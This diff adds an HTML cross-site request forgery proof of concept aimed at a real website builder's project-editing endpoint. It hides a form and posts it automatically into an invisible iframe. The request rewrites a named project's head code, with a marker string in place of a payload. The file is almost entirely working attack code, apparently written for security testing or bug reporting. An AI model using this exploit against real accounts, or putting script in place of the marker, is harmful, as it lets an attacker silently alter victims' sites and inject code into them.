@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>CSRF Test</title></head>
+<body>
+<h2>CSRF PoC</h2>
+<form id="f" action="https://tilda.cc/projects/submit/" method="POST">
+    <input type="hidden" name="comm" value="editprojectheadcode">
+    <input type="hidden" name="projectid" value="47575503">
+    <input type="hidden" name="headcode" value="CSRF_POC_MARKER_12345">
+</form>
+<iframe name="sink" style="width:1px;height:1px;border:0;"></iframe>
+<script>document.getElementById('f').target='sink'; document.getElementById('f').submit();</script>
+</body>
+</html>
